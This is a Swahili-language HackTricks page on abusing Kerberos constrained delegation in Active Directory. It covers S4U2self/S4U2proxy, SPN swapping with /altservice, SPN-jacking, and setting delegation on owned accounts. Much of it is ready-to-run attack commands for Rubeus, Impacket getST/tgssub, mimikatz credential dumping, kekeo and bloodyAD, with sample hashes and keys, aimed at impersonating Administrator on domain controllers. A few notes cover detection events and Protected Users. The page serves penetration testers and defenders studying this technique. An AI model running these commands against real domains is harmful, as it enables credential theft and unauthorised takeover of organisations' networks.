# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Kwa kutumia hii, Domain admin anaweza **kuruhusu** kompyuta **kuiga mtumiaji au kompyuta** dhidi ya **service** yoyote ya mashine.

- **Service for User to self (_S4U2self_):** Akaunti yoyote ya **service inayomiliki SPN** inaweza kwa kawaida kupata TGS inayoielekea yenyewe kwa niaba ya mtumiaji yeyote. Ikiwa akaunti pia ina [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) katika _userAccountControl_, TGS hiyo ni **forwardable**; jambo hili ndilo linalofanya protocol transition iwe na manufaa moja kwa moja kwa **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Akaunti ya **service** inaweza kupata TGS kwa niaba ya mtumiaji kwenda kwenye SPN zilizoorodheshwa katika **msDS-AllowedToDelegateTo**. Tiketi ya ushahidi inayotumika katika S4U2Proxy lazima iwe tiketi **forwardable** inayoelekea kwenye service inayofanya delegation: ama tiketi halisi ya client-to-service iliyokamatwa kutoka kwa mwathiriwa, au iliyozalishwa kwa kutumia **S4U2Self + T2A4D**.

**Kumbuka**: Ikiwa mtumiaji amewekewa alama ya ‘_Account is sensitive and cannot be delegated_’ katika AD, au ni mwanachama wa **Protected Users**, kwa kawaida **hutaweza kuwaiga** kupitia constrained delegation. Katika domain za kisasa, pendelea kutumia nyenzo za **AES** badala ya kutegemea dhana za RC4 pekee unapolenga akaunti zilizowezeshwa kwa delegation.

Hii ina maana kwamba ukifanikiwa **kuiba hash ya service**, unaweza **kuwaiga watumiaji** na kupata **ufikiaji** kwa niaba yao kwenye **service** yoyote kupitia mashine zilizoonyeshwa (inawezekana **privesc**).

Zaidi ya hayo, **hutapata tu ufikiaji wa service ambayo mtumiaji anaweza kuiga, bali pia wa service yoyote**, kwa sababu SPN (jina la service lililoombwa) haikaguliwi (sehemu hii haijasimbwa kwa njia fiche wala kutiwa saini kwenye tiketi). Kwa hiyo, ikiwa una ufikiaji wa **CIFS service**, unaweza pia kupata ufikiaji wa **HOST service** kwa kutumia flag ya `/altservice` katika Rubeus, kwa mfano. Udhaifu huohuo wa kubadilisha SPN hutumiwa vibaya na **Impacket getST -altservice** na zana nyingine.

Pia, kinachohitajika ili kutumia **DCSync** ni ufikiaji wa **LDAP service kwenye DC**.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Dokezo la operator:** usitegemee picha za skrini za **ADUC** au BloodHound pekee wakati wa kukagua **gMSA/sMSA**. Akaunti hizo mara nyingi huficha kichupo cha kawaida cha Delegation, kwa hivyo orodhesha moja kwa moja sifa ghafi za **`userAccountControl`** na **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-transition dhidi ya Kerberos-only constrained delegation

Ikiwa akaunti iliyodhibitiwa ina **T2A4D**, kwa kawaida unaweza kukamilisha mnyororo mzima wa **`S4U2Self -> S4U2Proxy`** kwa kutumia service key/TGT pekee.<sup>[[2]](#references)</sup>

Ikiwa ina **`msDS-AllowedToDelegateTo`** pekee (hali ya kawaida ya **"Use Kerberos only"**), delegation bado inaweza kutumika vibaya, lakini tiketi ya ushahidi kwa S4U2Proxy lazima iwe **forwardable user-to-service ticket** ya delegating service. Njia moja ni kunasa victim TGS kutoka **LSASS/ccache** na kuitumia katika hatua ya pili (`/tgs:` katika Rubeus). Tiketi ya S4U2Self isiyo **forwardable** haitoshi kwa classic constrained delegation; ikiwa hiyo ndiyo tiketi yako pekee ya ushahidi, angalia [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) badala yake.<sup>[[2]](#references)</sup>

Njia nyingine inayowezekana kwa masharti ni hatua ya kwanza ya [RBCD](resource-based-constrained-delegation.md) kwenda kwa delegating service: ikiwa itatoa tiketi ya **forwardable** kwa mtumiaji na service inayokusudiwa, tiketi hiyo inaweza kujaribiwa kama ushahidi kwa hatua ya baadaye ya Kerberos-only S4U2Proxy. Thibitisha flags za tiketi ya kwanza, SPN ya delegating service, allow-list yake ya malengo, na vizuizi vyovyote vya user delegation; udhibiti wa attribute ya RBCD pekee hauthibitishi hatua ya pili.

### Maelezo kuhusu cross-domain constrained delegation (2025+)

Tangu **Windows Server 2012/2012 R2**, KDC inasaidia **constrained delegation across domains/forests** kupitia viendelezi vya S4U2Proxy. Build za kisasa (Windows Server 2016–2025) zinaendeleza tabia hii na kuongeza PAC SIDs mbili kuashiria protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wakati mtumiaji alipojithibitisha kwa njia ya kawaida.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wakati service ilipothibitisha utambulisho kupitia protocol transition.

Tarajia `SERVICE_ASSERTED_IDENTITY` ndani ya PAC wakati protocol transition inatumika across domains; hii inathibitisha kuwa hatua ya S4U2Proxy ilifaulu.<sup>[[1]](#references)</sup>

### Zana za Impacket / Linux (altservice & full S4U)

Impacket ya hivi karibuni (0.11.x+) inaonyesha mnyororo uleule wa S4U na ubadilishaji wa SPN kama Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Ikiwa unapendelea kutengeneza ST ya mtumiaji kwanza (kwa mfano, ukiwa na hash ya offline pekee), tumia **ticketer.py** pamoja na **getST.py** kwa S4U2Proxy. **tgssub.py** pia ni muhimu ikiwa tayari una ccache inayofanya kazi na unahitaji tu kubadilisha service class kwa host hiyo hiyo. Angalia issue #1713 ya Impacket iliyo wazi kwa matatizo yanayojulikana kwa sasa (KRB_AP_ERR_MODIFIED wakati ST iliyotengenezwa haiendani na ufunguo wa SPN).<sup>[[2]](#references)</sup>

### SPN-jacking: kuelekeza upya lengo la constrained delegation

Classic constrained delegation huidhinisha **mfuatano wa SPN** katika `msDS-AllowedToDelegateTo`, si SID ya lengo isiyobadilika. Wakati wa S4U2Proxy, KDC hutafuta akaunti ambayo kwa sasa inamiliki SPN hiyo na kusimba tiketi ya huduma kwa kutumia ufunguo wa muda mrefu wa akaunti hiyo. Kwa hivyo, kudhibiti akaunti ya delegating pamoja na `WriteSPN` kwenye akaunti nyingine ya service/computer kunaweza kuelekeza upya kizuizi cha delegation kisichobadilika bila `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Kuna aina mbili:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** SPN iliyoruhusiwa imeachwa bila mmiliki kwa sababu mmiliki wake wa zamani alifutwa, akapewa jina jipya, au SPN iliondolewa kwake. Iongeze moja kwa moja kwenye akaunti lengwa unayotaka.
- **Live SPN-jacking:** SPN bado inamilikiwa na akaunti chanzo. Uthibitishaji wa duplicate-SPN kwa kawaida huzuia kuiandika kwenye akaunti lengwa, kwa hivyo `WriteSPN` inahitajika kwenye objekti zote mbili: iondoe kwenye chanzo, iongeze kwenye lengo, pata tiketi, kisha urejeshe usajili wa awali.

Mtiririko ufuatao wa Linux uliofupishwa huhamisha SPN iliyoruhusiwa, huendesha S4U kama principal aliyeathiriwa wa delegating, na kubadilisha jina la huduma la tiketi liwe huduma inayofaa kwenye lengo jipya.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` ni primitive ya pili, tofauti. Tiketi ya S4U2Proxy ilisimbwa kwa akaunti ambayo sasa inamiliki `$DELEGATED_SPN`; kwa kuwa jina la huduma la tiketi (`sname`) liko nje ya sehemu ya tiketi iliyosimbwa, tooling inaweza kubadilisha service class/hostname na kuweka nyingine ambayo huduma yake hutumia key hiyo hiyo ya akaunti. SPN-jacking hubadilisha kwanza **key ya akaunti gani** inayolinda tiketi, huku ubadilishaji wa service class ukibadilisha **mahali tiketi hiyo inawasilishwa**.<sup>[[5]](#references)[[6]](#references)</sup>

Kwa jacking ya live, geuza mpangilio wa LDAP writes hizo mbili mara tu baada ya kupata tiketi ili kuepuka kuvuruga huduma halali. Kwenye DCs zilizo na computer-account auditing iliyowezeshwa, tafuta Security event **4742** ambapo `servicePrincipalName` imeondolewa kwenye kompyuta moja na kuongezwa kwenye nyingine muda mfupi baadaye, hasa pale hostname ya SPN inapotofautiana na `dNSHostName` ya lengwa. Linganisha na event **4769**: S4U2Self huwasilisha akaunti ileile kama client/service, ilhali S4U2Proxy hujaza **Transited Services**.<sup>[[5]](#references)</sup>

### Kusanidi delegation kwenye akaunti unayodhibiti

Njia hii inahitaji **ruhusa halisi ya kuandika** kwenye sifa za delegation za akaunti ya kompyuta au huduma (kwa mfano, `GenericAll`, au `WriteDACL` ikifuatiwa na mabadiliko ya ACL) **pamoja na** haki ya mtumiaji ya `SeEnableDelegationPrivilege` kwa akaunti inayofanya mabadiliko ya LDAP. Microsoft inahitaji haki hiyo wakati `msDS-AllowedToDelegateTo` inaporekebishwa; haki za kudhibiti object pekee haziepuki sharti hilo. Hakikisha masharti yote mawili yametimizwa kabla ya kutumia LDAP client kama **bloodyAD** kuweka delegation ya protocol-transition.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Akaunti ya kompyuta iliyopo inaweza kuwa mgombea hata kama `ms-DS-MachineAccountQuota` ni sifuri; quota hiyo huweka kikomo kwa njia chaguomsingi ya kuunda kompyuta mpya, si haki za kutumia object iliyopo. Ili kutumia delegation iliyosanidiwa, unahitaji pia kudhibiti key au password ya akaunti inayokabidhi, service principal name halali, na mtumiaji lengwa ambaye credentials zake zinaweza kukabidhiwa. Masharti haya na ufikiaji halisi wa directory lazima vikaguliwe kando.

- Hatua ya 1: **Pata TGT ya huduma iliyoruhusiwa**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Kuna **njia nyingine za kupata tiketi ya TGT** au **RC4** au **AES256** bila kuwa SYSTEM kwenye kompyuta, kama vile Printer Bug na unconstrained delegation, NTLM relaying na matumizi mabaya ya Active Directory Certificate Service
>
> **Ukiwa tu na hiyo tiketi ya TGT (au hash yake), unaweza kutekeleza shambulio hili bila kuathiri kompyuta nzima.**

- Hatua ya 2: **Pata TGS ya huduma huku ukimwakilisha mtumiaji**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Maelezo zaidi katika ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) na [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Muhtasari wa Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Kutumia Vibaya Delegation kwa Impacket (Sehemu ya 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Imeua Domain: Muhtasari wa Kerberos wa Mashambulizi (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Kisa cha Pekee katika Matumizi Mabaya ya WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
